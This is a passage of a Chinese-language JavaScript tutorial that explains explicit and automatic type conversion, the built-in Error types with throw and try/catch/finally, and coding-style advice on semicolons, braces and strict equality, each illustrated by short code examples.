   上面代码中， ``Number`` 函数将 ``obj`` 对象转为数值。背后发生了一连串的操作，首先调用 ``obj.valueOf`` 方法, 结果返回对象本身；于是，继续调用 ``obj.toString`` 方法，这时返回字符串 ``[object Object]`` ，对这个字符串使用 ``Number`` 函数，得到 ``NaN`` 。

   默认情况下，对象的 ``valueOf`` 方法返回对象本身，所以一般总是会调用 ``toString`` 方法，而 ``toString`` 方法返回对象的类型字符串（比如 ``[object Object]`` ）。所以，会有下面的结果。

   .. code:: javascript

      Number({}) // NaN

   如果 ``toString`` 方法返回的不是原始类型的值，结果就会报错。

   .. code:: javascript

      var obj = {
        valueOf: function () {
          return {};
        },
        toString: function () {
          return {};
        }
      };
   
      Number(obj)
      // TypeError: Cannot convert object to primitive value

   上面代码的 ``valueOf`` 和 ``toString`` 方法，返回的都是对象，所以转成数值时会报错。

   从上例还可以看到， ``valueOf`` 和 ``toString`` 方法，都是可以自定义的。

   .. code:: javascript

      Number({
        valueOf: function () {
          return 2;
        }
      })
      // 2
   
      Number({
        toString: function () {
          return 3;
        }
      })
      // 3
   
      Number({
        valueOf: function () {
          return 2;
        },
        toString: function () {
          return 3;
        }
      })
      // 2

   上面代码对三个对象使用 ``Number`` 函数。第一个对象返回 ``valueOf`` 方法的值，第二个对象返回 ``toString`` 方法的值，第三个对象表示 ``valueOf`` 方法先于 ``toString`` 方法执行。

String()
~~~~~~~~~

    ``String`` 函数可以将任意类型的值转化成字符串，转换规则如下。

   **（1）原始类型值**

   - **数值**：转为相应的字符串。
   - **字符串**：转换后还是原来的值。
   - **布尔值**： ``true`` 转为字符串 ``"true"`` ， ``false`` 转为字符串 ``"false"`` 。
   - **undefined**：转为字符串 ``"undefined"`` 。
   - **null**：转为字符串 ``"null"`` 。

   .. code:: javascript

      String(123) // "123"
      String('abc') // "abc"
      String(true) // "true"
      String(undefined) // "undefined"
      String(null) // "null"

   **（2）对象**

    ``String`` 方法的参数如果是对象，返回一个类型字符串；如果是数组，返回该数组的字符串形式。

   .. code:: javascript

      String({a: 1}) // "[object Object]"
      String([1, 2, 3]) // "1,2,3"

    ``String`` 方法背后的转换规则，与 ``Number`` 方法基本相同，只是互换了 ``valueOf`` 方法和 ``toString`` 方法的执行顺序。

   1. 先调用对象自身的 ``toString`` 方法。如果返回原始类型的值，则对该值使用 ``String`` 函数，不再进行以下步骤。

   2. 如果 ``toString`` 方法返回的是对象，再调用原对象的 ``valueOf`` 方法。如果 ``valueOf`` 方法返回原始类型的值，则对该值使用 ``String`` 函数，不再进行以下步骤。

   3. 如果 ``valueOf`` 方法返回的是对象，就报错。

   下面是一个例子。

   .. code:: javascript

      String({a: 1})
      // "[object Object]"
   
      // 等同于
      String({a: 1}.toString())
      // "[object Object]"

   上面代码先调用对象的 ``toString`` 方法，发现返回的是字符串 ``[object Object]`` ，就不再调用 ``valueOf`` 方法了。

   如果 ``toString`` 法和 ``valueOf`` 方法，返回的都是对象，就会报错。

   .. code:: javascript

      var obj = {
        valueOf: function () {
          return {};
        },
        toString: function () {
          return {};
        }
      };
   
      String(obj)
      // TypeError: Cannot convert object to primitive value

   下面是通过自定义 ``toString`` 方法，改变返回值的例子。

   .. code:: javascript

      String({
        toString: function () {
          return 3;
        }
      })
      // "3"
   
      String({
        valueOf: function () {
          return 2;
        }
      })
      // "[object Object]"
   
      String({
        valueOf: function () {
          return 2;
        },
        toString: function () {
          return 3;
        }
      })
      // "3"

   上面代码对三个对象使用 ``String`` 函数。第一个对象返回 ``toString`` 方法的值（数值3），第二个对象返回的还是 ``toString`` 方法的值（ ``[object Object]`` ），第三个对象表示 ``toString`` 方法先于 ``valueOf`` 方法执行。

Boolean()
~~~~~~~~~~

    ``Boolean()`` 函数可以将任意类型的值转为布尔值。

   它的转换规则相对简单：除了以下五个值的转换结果为 ``false`` ，其他的值全部为 ``true`` 。

   -  ``undefined`` 
   -  ``null`` 
   -  ``0`` （包含 ``-0`` 和 ``+0`` ）
   -  ``NaN`` 
   -  ``''`` （空字符串）

   .. code:: javascript

      Boolean(undefined) // false
      Boolean(null) // false
      Boolean(0) // false
      Boolean(NaN) // false
      Boolean('') // false

   当然， ``true`` 和 ``false`` 这两个布尔值不会发生变化。

   .. code:: javascript

      Boolean(true) // true
      Boolean(false) // false

   注意，所有对象（包括空对象）的转换结果都是 ``true`` ，甚至连 ``false`` 对应的布尔对象 ``new Boolean(false)`` 也是 ``true`` （详见《原始类型值的包装对象》一章）。

   .. code:: javascript

      Boolean({}) // true
      Boolean([]) // true
      Boolean(new Boolean(false)) // true

   所有对象的布尔值都是 ``true`` ，这是因为 JavaScript 语言设计的时候，出于性能的考虑，如果对象需要计算才能得到布尔值，对于 ``obj1 && obj2`` 这样的场景，可能会需要较多的计算。为了保证性能，就统一规定，对象的布尔值为 ``true`` 。

自动转换
-------

   下面介绍自动转换，它是以强制转换为基础的。

   遇到以下三种情况时，JavaScript 会自动转换数据类型，即转换是自动完成的，用户不可见。

   第一种情况，不同类型的数据互相运算。

   .. code:: javascript

      123 + 'abc' // "123abc"

   第二种情况，对非布尔值类型的数据求布尔值。

   .. code:: javascript

      if ('abc') {
        console.log('hello')
      }  // "hello"

   第三种情况，对非数值类型的值使用一元运算符（即 ``+`` 和 ``-`` ）。

   .. code:: javascript

      + {foo: 'bar'} // NaN
      - [1, 2, 3] // NaN

   自动转换的规则是这样的：预期什么类型的值，就调用该类型的转换函数。比如，某个位置预期为字符串，就调用 ``String()`` 函数进行转换。如果该位置既可以是字符串，也可能是数值，那么默认转为数值。

   由于自动转换具有不确定性，而且不易除错，建议在预期为布尔值、数值、字符串的地方，全部使用 ``Boolean()`` 、 ``Number()`` 和 ``String()`` 函数进行显式转换。

自动转换为布尔值
~~~~~~~~~~~~~

   JavaScript 遇到预期为布尔值的地方（比如 ``if`` 语句的条件部分），就会将非布尔值的参数自动转换为布尔值。系统内部会自动调用 ``Boolean()`` 函数。

   因此除了以下五个值，其他都是自动转为 ``true`` 。

   -  ``undefined`` 
   -  ``null`` 
   -  ``+0`` 或 ``-0`` 
   -  ``NaN`` 
   -  ``''`` （空字符串）

   下面这个例子中，条件部分的每个值都相当于 ``false`` ，使用否定运算符后，就变成了 ``true`` 。

   .. code:: javascript

      if ( !undefined
        && !null
        && !0
        && !NaN
        && !''
      ) {
        console.log('true');
      } // true

   下面两种写法，有时也用于将一个表达式转为布尔值。它们内部调用的也是 ``Boolean()`` 函数。

   .. code:: javascript

      // 写法一
      expression ? true : false
   
      // 写法二
      !! expression

自动转换为字符串
~~~~~~~~~~~~~

   JavaScript 遇到预期为字符串的地方，就会将非字符串的值自动转为字符串。具体规则是，先将复合类型的值转为原始类型的值，再将原始类型的值转为字符串。

   字符串的自动转换，主要发生在字符串的加法运算时。当一个值为字符串，另一个值为非字符串，则后者转为字符串。

   .. code:: javascript

      '5' + 1 // '51'
      '5' + true // "5true"
      '5' + false // "5false"
      '5' + {} // "5[object Object]"
      '5' + [] // "5"
      '5' + function (){} // "5function (){}"
      '5' + undefined // "5undefined"
      '5' + null // "5null"

   这种自动转换很容易出错。

   .. code:: javascript

      var obj = {
        width: '100'
      };
   
      obj.width + 20 // "10020"

   上面代码中，开发者可能期望返回 ``120`` ，但是由于自动转换，实际上返回了一个字符 ``10020`` 。

自动转换为数值
~~~~~~~~~~~~

   JavaScript 遇到预期为数值的地方，就会将参数值自动转换为数值。系统内部会自动调用 ``Number()`` 函数。

   除了加法运算符（ ``+`` ）有可能把运算子转为字符串，其他运算符都会把运算子自动转成数值。

   .. code:: javascript

      '5' - '2' // 3
      '5' * '2' // 10
      true - 1  // 0
      false - 1 // -1
      '1' - 1   // 0
      '5' * []    // 0
      false / '5' // 0
      'abc' - 1   // NaN
      null + 1 // 1
      undefined + 1 // NaN

   上面代码中，运算符两侧的运算子，都被转成了数值。

   > 注意： ``null`` 转为数值时为 ``0`` ，而 ``undefined`` 转为数值时为 ``NaN`` 。

   一元运算符也会把运算子转成数值。

   .. code:: javascript

      +'abc' // NaN
      -'abc' // NaN
      +true // 1
      -false // 0

参考链接
-------

   - Axel Rauschmayer, [What is {} + {} in JavaScript?](http://www.2ality.com/2012/01/object-plus-object.html)
   - Axel Rauschmayer, [JavaScript quirk 1: implicit conversion of values](http://www.2ality.com/2013/04/quirk-implicit-conversion.html)
   - Benjie Gillam, [Quantum JavaScript?](http://www.benjiegillam.com/2013/06/quantum-javascript/)

/🟠 错误处理机制
==============

Error 实例对象
-------------

   JavaScript 解析或运行时，一旦发生错误，引擎就会抛出一个错误对象。JavaScript 原生提供 ``Error`` 构造函数，所有抛出的错误都是这个构造函数的实例。

   .. code:: javascript

      var err = new Error('出错了');
      err.message // "出错了"

   上面代码中，我们调用 ``Error()`` 构造函数，生成一个实例对象 ``err`` 。 ``Error()`` 构造函数接受一个参数，表示错误提示，可以从实例的 ``message`` 属性读到这个参数。抛出 ``Error`` 实例对象以后，整个程序就中断在发生错误的地方，不再往下执行。

   JavaScript 语言标准只提到， ``Error`` 实例对象必须有 ``message`` 属性，表示出错时的提示信息，没有提到其他属性。大多数 JavaScript 引擎，对 ``Error`` 实例还提供 ``name`` 和 ``stack`` 属性，分别表示错误的名称和错误的堆栈，但它们是非标准的，不是每种实现都有。

   - **message**：错误提示信息
   - **name**：错误名称（非标准属性）
   - **stack**：错误的堆栈（非标准属性）

   使用 ``name`` 和 ``message`` 这两个属性，可以对发生什么错误有一个大概的了解。

   .. code:: javascript

      if (error.name) {
        console.log(error.name + ': ' + error.message);
      }

    ``stack`` 属性用来查看错误发生时的堆栈。

   .. code:: javascript

      function throwit() {
        throw new Error('');
      }
   
      function catchit() {
        try {
          throwit();
        } catch(e) {
          console.log(e.stack); // print stack trace
        }
      }
   
      catchit()
      // Error
      //    at throwit (~/examples/throwcatch.js:9:11)
      //    at catchit (~/examples/throwcatch.js:3:9)
      //    at repl:1:5

   上面代码中，错误堆栈的最内层是 ``throwit`` 函数，然后是 ``catchit`` 函数，最后是函数的运行环境。

原生错误类型
----------

    ``Error`` 实例对象是最一般的错误类型，在它的基础上，JavaScript 还定义了其他6种错误对象。也就是说，存在 ``Error`` 的6个派生对象。

SyntaxError 对象
~~~~~~~~~~~~~~~

    ``SyntaxError`` 对象是解析代码时发生的语法错误。

   .. code:: javascript

      // 变量名错误
      var 1a;
      // Uncaught SyntaxError: Invalid or unexpected token
   
      // 缺少括号
      console.log 'hello');
      // Uncaught SyntaxError: Unexpected string

   上面代码的错误，都是在语法解析阶段就可以发现，所以会抛出 ``SyntaxError`` 。第一个错误提示是“token 非法”，第二个错误提示是“字符串不符合要求”。

ReferenceError 对象
~~~~~~~~~~~~~~~~~~~

    ``ReferenceError`` 对象是引用一个不存在的变量时发生的错误。

   .. code:: javascript

      // 使用一个不存在的变量
      unknownVariable
      // Uncaught ReferenceError: unknownVariable is not defined

   另一种触发场景是，将一个值分配给无法分配的对象，比如对函数的运行结果赋值。

   .. code:: javascript

      // 等号左侧不是变量
      console.log() = 1
      // Uncaught ReferenceError: Invalid left-hand side in assignment

   上面代码对函数 ``console.log`` 的运行结果赋值，结果引发了 ``ReferenceError`` 错误。

RangeError 对象
~~~~~~~~~~~~~~

    ``RangeError`` 对象是一个值超出有效范围时发生的错误。主要有几种情况，一是数组长度为负数，二是 ``Number`` 对象的方法参数超出范围，以及函数堆栈超过最大值。

   .. code:: javascript

      // 数组长度不得为负数
      new Array(-1)
      // Uncaught RangeError: Invalid array length

TypeError 对象
~~~~~~~~~~~~~~

    ``TypeError`` 对象是变量或参数不是预期类型时发生的错误。比如，对字符串、布尔值、数值等原始类型的值使用 ``new`` 命令，就会抛出这种错误，因为 ``new`` 命令的参数应该是一个构造函数。

   .. code:: javascript

      new 123
      // Uncaught TypeError: 123 is not a constructor
   
      var obj = {};
      obj.unknownMethod()
      // Uncaught TypeError: obj.unknownMethod is not a function

   上面代码的第二种情况，调用对象不存在的方法，也会抛出 ``TypeError`` 错误，因为 ``obj.unknownMethod`` 的值是 ``undefined`` ，而不是一个函数。

URIError 对象
~~~~~~~~~~~~

    ``URIError`` 对象是 URI 相关函数的参数不正确时抛出的错误，主要涉及 ``encodeURI()`` 、 ``decodeURI()`` 、 ``encodeURIComponent()`` 、 ``decodeURIComponent()`` 、 ``escape()`` 和 ``unescape()`` 这六个函数。

   .. code:: javascript

      decodeURI('%2')
      // URIError: URI malformed

EvalError 对象
~~~~~~~~~~~~~~

    ``eval`` 函数没有被正确执行时，会抛出 ``EvalError`` 错误。该错误类型已经不再使用了，只是为了保证与以前代码兼容，才继续保留。

总结
~~~

   以上这6种派生错误，连同原始的 ``Error`` 对象，都是构造函数。开发者可以使用它们，手动生成错误对象的实例。这些构造函数都接受一个参数，代表错误提示信息（message）。

   .. code:: javascript

      var err1 = new Error('出错了！');
      var err2 = new RangeError('出错了，变量超出有效范围！');
      var err3 = new TypeError('出错了，变量类型无效！');
   
      err1.message // "出错了！"
      err2.message // "出错了，变量超出有效范围！"
      err3.message // "出错了，变量类型无效！"

自定义错误
--------

   除了 JavaScript 原生提供的七种错误对象，还可以定义自己的错误对象。

   .. code:: javascript

      function UserError(message) {
        this.message = message || '默认信息';
        this.name = 'UserError';
      }
   
      UserError.prototype = new Error();
      UserError.prototype.constructor = UserError;

   上面代码自定义一个错误对象 ``UserError`` ，让它继承 ``Error`` 对象。然后，就可以生成这种自定义类型的错误了。

   .. code:: javascript

      new UserError('这是自定义的错误！');

throw 语句
----------

    ``throw`` 语句的作用是手动中断程序执行，抛出一个错误。

   .. code:: javascript

      var x = -1;
   
      if (x <= 0) {
        throw new Error('x 必须为正数');
      }
      // Uncaught Error: x 必须为正数

   上面代码中，如果变量 ``x`` 小于等于 ``0`` ，就手动抛出一个错误，告诉用户 ``x`` 的值不正确，整个程序就会在这里中断执行。可以看到， ``throw`` 抛出的错误就是它的参数，这里是一个 ``Error`` 对象的实例。

    ``throw`` 也可以抛出自定义错误。

   .. code:: javascript

      function UserError(message) {
        this.message = message || '默认信息';
        this.name = 'UserError';
      }
   
      throw new UserError('出错了！');
      // Uncaught UserError {message: "出错了！", name: "UserError"}

   上面代码中， ``throw`` 抛出的是一个 ``UserError`` 实例。

   实际上， ``throw`` 可以抛出任何类型的值。也就是说，它的参数可以是任何值。

   .. code:: javascript

      // 抛出一个字符串
      throw 'Error！';
      // Uncaught Error！
   
      // 抛出一个数值
      throw 42;
      // Uncaught 42
   
      // 抛出一个布尔值
      throw true;
      // Uncaught true
   
      // 抛出一个对象
      throw {
        toString: function () {
          return 'Error!';
        }
      };
      // Uncaught {toString: ƒ}

   对于 JavaScript 引擎来说，遇到 ``throw`` 语句，程序就中止了。引擎会接收到 ``throw`` 抛出的信息，可能是一个错误实例，也可能是其他类型的值。

try...catch 结构
---------------

   一旦发生错误，程序就中止执行了。JavaScript 提供了 ``try...catch`` 结构，允许对错误进行处理，选择是否往下执行。

   .. code:: javascript

      try {
        throw new Error('出错了!');
      } catch (e) {
        console.log(e.name + ": " + e.message);
        console.log(e.stack);
      }
      // Error: 出错了!
      //   at <anonymous>:3:9
      //   ...

   上面代码中， ``try`` 代码块抛出错误（上例用的是 ``throw`` 语句），JavaScript 引擎就立即把代码的执行，转到 ``catch`` 代码块，或者说错误被 ``catch`` 代码块捕获了。 ``catch`` 接受一个参数，表示 ``try`` 代码块抛出的值。

   如果你不确定某些代码是否会报错，就可以把它们放在 ``try...catch`` 代码块之中，便于进一步对错误进行处理。

   .. code:: javascript

      try {
        f();
      } catch(e) {
        // 处理错误
      }

   上面代码中，如果函数 ``f`` 执行报错，就会进行 ``catch`` 代码块，接着对错误进行处理。

    ``catch`` 代码块捕获错误之后，程序不会中断，会按照正常流程继续执行下去。

   .. code:: javascript

      try {
        throw "出错了";
      } catch (e) {
        console.log(111);
      }
      console.log(222);
      // 111
      // 222

   上面代码中， ``try`` 代码块抛出的错误，被 ``catch`` 代码块捕获后，程序会继续向下执行。

    ``catch`` 代码块之中，还可以再抛出错误，甚至使用嵌套的 ``try...catch`` 结构。

   .. code:: javascript

      var n = 100;
   
      try {
        throw n;
      } catch (e) {
        if (e <= 50) {
          // ...
        } else {
          throw e;
        }
      }
      // Uncaught 100

   上面代码中， ``catch`` 代码之中又抛出了一个错误。

   为了捕捉不同类型的错误， ``catch`` 代码块之中可以加入判断语句。

   .. code:: javascript

      try {
        foo.bar();
      } catch (e) {
        if (e instanceof EvalError) {
          console.log(e.name + ": " + e.message);
        } else if (e instanceof RangeError) {
          console.log(e.name + ": " + e.message);
        }
        // ...
      }

   上面代码中， ``catch`` 捕获错误之后，会判断错误类型（ ``EvalError`` 还是 ``RangeError`` ），进行不同的处理。

finally 代码块
-------------

    ``try...catch`` 结构允许在最后添加一个 ``finally`` 代码块，表示不管是否出现错误，都必需在最后运行的语句。

   .. code:: javascript

      function cleansUp() {
        try {
          throw new Error('出错了……');
          console.log('此行不会执行');
        } finally {
          console.log('完成清理工作');
        }
      }
   
      cleansUp()
      // 完成清理工作
      // Uncaught Error: 出错了……
      //    at cleansUp (<anonymous>:3:11)
      //    at <anonymous>:10:1

   上面代码中，由于没有 ``catch`` 语句块，一旦发生错误，代码就会中断执行。中断执行之前，会先执行 ``finally`` 代码块，然后再向用户提示报错信息。

   .. code:: javascript

      function idle(x) {
        try {
          console.log(x);
          return 'result';
        } finally {
          console.log('FINALLY');
        }
      }
   
      idle('hello')
      // hello
      // FINALLY

   上面代码中， ``try`` 代码块没有发生错误，而且里面还包括 ``return`` 语句，但是 ``finally`` 代码块依然会执行。而且，这个函数的返回值还是 ``result`` 。

   下面的例子说明， ``return`` 语句的执行是排在 ``finally`` 代码之前，只是等 ``finally`` 代码执行完毕后才返回。

   .. code:: javascript

      var count = 0;
      function countUp() {
        try {
          return count;
        } finally {
          count++;
        }
      }
   
      countUp()
      // 0
      count
      // 1

   上面代码说明， ``return`` 语句里面的 ``count`` 的值，是在 ``finally`` 代码块运行之前就获取了。

   下面是 ``finally`` 代码块用法的典型场景。

   .. code:: javascript

      openFile();
   
      try {
        writeFile(Data);
      } catch(e) {
        handleError(e);
      } finally {
        closeFile();
      }

   上面代码首先打开一个文件，然后在 ``try`` 代码块中写入文件，如果没有发生错误，则运行 ``finally`` 代码块关闭文件；一旦发生错误，则先使用 ``catch`` 代码块处理错误，再使用 ``finally`` 代码块关闭文件。

   下面的例子充分反映了 ``try...catch...finally`` 这三者之间的执行顺序。

   .. code:: javascript

      function f() {
        try {
          console.log(0);
          throw 'bug';
        } catch(e) {
          console.log(1);
          return true; // 这句原本会延迟到 finally 代码块结束再执行
          console.log(2); // 不会运行
        } finally {
          console.log(3);
          return false; // 这句会覆盖掉前面那句 return
          console.log(4); // 不会运行
        }
   
        console.log(5); // 不会运行
      }
   
      var result = f();
      // 0
      // 1
      // 3
   
      result
      // false

   上面代码中， ``catch`` 代码块结束执行之前，会先执行 ``finally`` 代码块。

    ``catch`` 代码块之中，触发转入 ``finally`` 代码块的标志，不仅有 ``return`` 语句，还有 ``throw`` 语句。

   .. code:: javascript

      function f() {
        try {
          throw '出错了！';
        } catch(e) {
          console.log('捕捉到内部错误');
          throw e; // 这句原本会等到finally结束再执行
        } finally {
          return false; // 直接返回
        }
      }
   
      try {
        f();
      } catch(e) {
        // 此处不会执行
        console.log('caught outer "bogus"');
      }
   
      //  捕捉到内部错误

   上面代码中，进入 ``catch`` 代码块之后，一遇到 ``throw`` 语句，就会去执行 ``finally`` 代码块，其中有 ``return false`` 语句，因此就直接返回了，不再会回去执行 ``catch`` 代码块剩下的部分了。

    ``try`` 代码块内部，还可以再使用 ``try`` 代码块。

   .. code:: javascript

      try {
        try {
          consle.log('Hello world!'); // 报错
        }
        finally {
          console.log('Finally');
        }
        console.log('Will I run?');
      } catch(error) {
        console.error(error.message);
      }
      // Finally
      // consle is not defined

   上面代码中， ``try`` 里面还有一个 ``try`` 。内层的 ``try`` 报错（ ``console`` 拼错了），这时会执行内层的 ``finally`` 代码块，然后抛出错误，被外层的 ``catch`` 捕获。

参考连接
-------

   - Jani Hartikainen, [JavaScript Errors and How to Fix Them](http://davidwalsh.name/fix-javascript-errors)

/🟠 编程风格
===========

概述
---

   “编程风格”（programming style）指的是编写代码的样式规则。不同的程序员，往往有不同的编程风格。

   有人说，编译器的规范叫做“语法规则”（grammar），这是程序员必须遵守的；而编译器忽略的部分，就叫“编程风格”（programming style），这是程序员可以自由选择的。这种说法不完全正确，程序员固然可以自由选择编程风格，但是好的编程风格有助于写出质量更高、错误更少、更易于维护的程序。

   所以，编程风格的选择不应该基于个人爱好、熟悉程度、打字量等因素，而要考虑如何尽量使代码清晰易读、减少出错。你选择的，不是你喜欢的风格，而是一种能够清晰表达你的意图的风格。这一点，对于 JavaScript 这种语法自由度很高的语言尤其重要。

   必须牢记的一点是，如果你选定了一种“编程风格”，就应该坚持遵守，切忌多种风格混用。如果你加入他人的项目，就应该遵守现有的风格。

缩进
---

   行首的空格和 Tab 键，都可以产生代码缩进效果（indent）。

   Tab 键可以节省击键次数，但不同的文本编辑器对 Tab 的显示不尽相同，有的显示四个空格，有的显示两个空格，所以有人觉得，空格键可以使得显示效果更统一。

   无论你选择哪一种方法，都是可以接受的，要做的就是始终坚持这一种选择。不要一会使用 Tab 键，一会使用空格键。

区块
---

   如果循环和判断的代码体只有一行，JavaScript 允许该区块（block）省略大括号。

   .. code:: javascript

      if (a)
        b();
        c();

   上面代码的原意可能是下面这样。

   .. code:: javascript

      if (a) {
        b();
        c();
      }

   但是，实际效果却是下面这样。

   .. code:: javascript

      if (a) {
        b();
      }
        c();

   因此，建议总是使用大括号表示区块。

   另外，区块起首的大括号的位置，有许多不同的写法。最流行的有两种，一种是起首的大括号另起一行。

   .. code:: javascript

      block
      {
        // ...
      }

   另一种是起首的大括号跟在关键字的后面。

   .. code:: javascript

      block {
        // ...
      }

   一般来说，这两种写法都可以接受。但是，JavaScript 要使用后一种，因为 JavaScript 会自动添加句末的分号，导致一些难以察觉的错误。

   .. code:: javascript

      return
      {
        key: value
      };
   
      // 相当于
      return;
      {
        key: value
      };

   上面的代码的原意，是要返回一个对象，但实际上返回的是 ``undefined`` ，因为 JavaScript 自动在 ``return`` 语句后面添加了分号。为了避免这一类错误，需要写成下面这样。

   .. code:: javascript

      return {
        key : value
      };

   因此，表示区块起首的大括号，不要另起一行。

圆括号
-----

   圆括号（parentheses）在 JavaScript 中有两种作用，一种表示函数的调用，另一种表示表达式的组合（grouping）。

   .. code:: javascript

      // 圆括号表示函数的调用
      console.log('abc');
   
      // 圆括号表示表达式的组合
      (1 + 2) * 3

   建议可以用空格，区分这两种不同的括号。

   > 1. 表示函数调用时，函数名与左括号之间没有空格。
   >
   > 2. 表示函数定义时，函数名与左括号之间没有空格。
   >
   > 3. 其他情况时，前面位置的语法元素与左括号之间，都有一个空格。

   按照上面的规则，下面的写法都是不规范的。

   .. code:: javascript

      foo (bar)
      return(a+b);
      if(a === 0) {...}
      function foo (b) {...}
      function(x) {...}

   上面代码的最后一行是一个匿名函数， ``function`` 是语法关键字，不是函数名，所以与左括号之间应该要有一个空格。

行尾的分号
--------

   分号表示一条语句的结束。JavaScript 允许省略行尾的分号。事实上，确实有一些开发者行尾从来不写分号。但是，由于下面要讨论的原因，建议还是不要省略这个分号。

不使用分号的情况
~~~~~~~~~~~~~

   首先，以下三种情况，语法规定本来就不需要在结尾添加分号。

   **（1）for 和 while 循环**

   .. code:: javascript

      for ( ; ; ) {
      } // 没有分号
   
      while (true) {
      } // 没有分号

   注意， ``do...while`` 循环是有分号的。

   .. code:: javascript

      do {
        a--;
      } while(a > 0); // 分号不能省略

   **（2）分支语句：if，switch，try**

   .. code:: javascript

      if (true) {
      } // 没有分号
   
      switch () {
      } // 没有分号
   
      try {
      } catch {
      } // 没有分号

   **（3）函数的声明语句**

   .. code:: javascript

      function f() {
      } // 没有分号

   注意，函数表达式仍然要使用分号。

   .. code:: javascript

      var f = function f() {
      };

   以上三种情况，如果使用了分号，并不会出错。因为，解释引擎会把这个分号解释为空语句。

分号的自动添加
~~~~~~~~~~~~

   除了上一节的三种情况，所有语句都应该使用分号。但是，如果没有使用分号，大多数情况下，JavaScript 会自动添加。

   .. code:: javascript

      var a = 1
      // 等同于
      var a = 1;

   这种语法特性被称为“分号的自动添加”（Automatic Semicolon Insertion，简称 ASI）。

   因此，有人提倡省略句尾的分号。麻烦的是，如果下一行的开始可以与本行的结尾连在一起解释，JavaScript 就不会自动添加分号。

   .. code:: javascript

      // 等同于 var a = 3
      var
      a
      =
      3
   
      // 等同于 'abc'.length
      'abc'
      .length
   
      // 等同于 return a + b;
      return a +
      b;
   
      // 等同于 obj.foo(arg1, arg2);
      obj.foo(arg1,
      arg2);
   
      // 等同于 3 * 2 + 10 * (27 / 6)
      3 * 2
      +
      10 * (27 / 6)

   上面代码都会多行放在一起解释，不会每一行自动添加分号。这些例子还是比较容易看出来的，但是下面这个例子就不那么容易看出来了。

   .. code:: javascript

      x = y
      (function () {
        // ...
      })();
   
      // 等同于
      x = y(function () {...})();

   下面是更多不会自动添加分号的例子。

   .. code:: javascript

      // 引擎解释为 c(d+e)
      var a = b + c
      (d+e).toString();
   
      // 引擎解释为 a = b/hi/g.exec(c).map(d)
      // 正则表达式的斜杠，会当作除法运算符
      a = b
      /hi/g.exec(c).map(d);
   
      // 解释为'b'['red', 'green']，
      // 即把字符串当作一个数组，按索引取值
      var a = 'b'
      ['red', 'green'].forEach(function (c) {
        console.log(c);
      })
   
      // 解释为 function (x) { return x }(a++)
      // 即调用匿名函数，结果f等于0
      var a = 0;
      var f = function (x) { return x }
      (a++)

   只有下一行的开始与本行的结尾，无法放在一起解释，JavaScript 引擎才会自动添加分号。

   .. code:: javascript

      if (a < 0) a = 0
      console.log(a)
   
      // 等同于下面的代码，
      // 因为 0console 没有意义
      if (a < 0) a = 0;
      console.log(a)

   另外，如果一行的起首是“自增”（ ``++`` ）或“自减”（ ``--`` ）运算符，则它们的前面会自动添加分号。

   .. code:: javascript

      a = b = c = 1
   
      a
      ++
      b
      --
      c
   
      console.log(a, b, c)
      // 1 2 0

   上面代码之所以会得到 ``1 2 0`` 的结果，原因是自增和自减运算符前，自动加上了分号。上面的代码实际上等同于下面的形式。

   .. code:: javascript

      a = b = c = 1;
      a;
      ++b;
      --c;

   如果 ``continue`` 、 ``break`` 、 ``return`` 和 ``throw`` 这四个语句后面，直接跟换行符，则会自动添加分号。这意味着，如果 ``return`` 语句返回的是一个对象的字面量，起首的大括号一定要写在同一行，否则得不到预期结果。

   .. code:: javascript

      return
      { first: 'Jane' };
   
      // 解释成
      return;
      { first: 'Jane' };

   由于解释引擎自动添加分号的行为难以预测，因此编写代码的时候不应该省略行尾的分号。

   不应该省略结尾的分号，还有一个原因。有些 JavaScript 代码压缩器（uglifier）不会自动添加分号，因此遇到没有分号的结尾，就会让代码保持原状，而不是压缩成一行，使得压缩无法得到最优的结果。

   另外，不写结尾的分号，可能会导致脚本合并出错。所以，有的代码库在第一行语句开始前，会加上一个分号。

   .. code:: javascript

      ;var a = 1;
      // ...

   上面这种写法就可以避免与其他脚本合并时，排在前面的脚本最后一行语句没有分号，导致运行出错的问题。

全局变量
-------

   JavaScript 最大的语法缺点，可能就是全局变量对于任何一个代码块，都是可读可写。这对代码的模块化和重复使用，非常不利。

   因此，建议避免使用全局变量。如果不得不使用，可以考虑用大写字母表示变量名，这样更容易看出这是全局变量，比如 ``UPPER_CASE`` 。

变量声明
-------

   JavaScript 会自动将变量声明“提升”（hoist）到代码块（block）的头部。

   .. code:: javascript

      if (!x) {
        var x = {};
      }
   
      // 等同于
      var x;
      if (!x) {
        x = {};
      }

   这意味着，变量 ``x`` 是 ``if`` 代码块之前就存在了。为了避免可能出现的问题，最好把变量声明都放在代码块的头部。

   .. code:: javascript

      for (var i = 0; i < 10; i++) {
        // ...
      }
   
      // 写成
      var i;
      for (i = 0; i < 10; i++) {
        // ...
      }

   上面这样的写法，就容易看出存在一个全局的循环变量 ``i`` 。

   另外，所有函数都应该在使用之前定义。函数内部的变量声明，都应该放在函数的头部。

with 语句
---------

    ``with`` 可以减少代码的书写，但是会造成混淆。

   .. code:: javascript

      with (o) {
      　foo = bar;
      }

   上面的代码，可以有四种运行结果：

   .. code:: javascript

      o.foo = bar;
      o.foo = o.bar;
      foo = bar;
      foo = o.bar;

   这四种结果都可能发生，取决于不同的变量是否有定义。因此，不要使用 ``with`` 语句。

相等和严格相等
------------

   JavaScript 有两个表示相等的运算符：“相等”（ ``==`` ）和“严格相等”（ ``===`` ）。

   相等运算符会自动转换变量类型，造成很多意想不到的情况。

   .. code:: javascript

      0 == ''// true
      1 == true // true
      2 == true // false
      0 == '0' // true
      false == 'false' // false
      false == '0' // true
      ' \t\r\n ' == 0 // true

   因此，建议不要使用相等运算符（ ``==`` ），只使用严格相等运算符（ ``===`` ）。

语句的合并
--------

   有些程序员追求简洁，喜欢合并不同目的的语句。比如，原来的语句是

   .. code:: javascript

      a = b;
      if (a) {
        // ...
      }

   他喜欢写成下面这样。

   .. code:: javascript

      if (a = b) {
        // ...
      }

   虽然语句少了一行，但是可读性大打折扣，而且会造成误读，让别人误解这行代码的意思是下面这样。

   .. code:: javascript

      if （a === b）{
        // ...
      }

   建议不要将不同目的的语句，合并成一行。

自增和自减运算符
-------------

   自增（ ``++`` ）和自减（ ``--`` ）运算符，放在变量的前面或后面，返回的值不一样，很容易发生错误。事实上，所有的 ``++`` 运算符都可以用 ``+= 1`` 代替。

   .. code:: javascript

      ++x
      // 等同于
      x += 1;

   改用 ``+= 1`` ，代码变得更清晰了。

   建议自增（ ``++`` ）和自减（ ``--`` ）运算符尽量使用 ``+=`` 和 ``-=`` 代替。

switch...case 结构
------------------

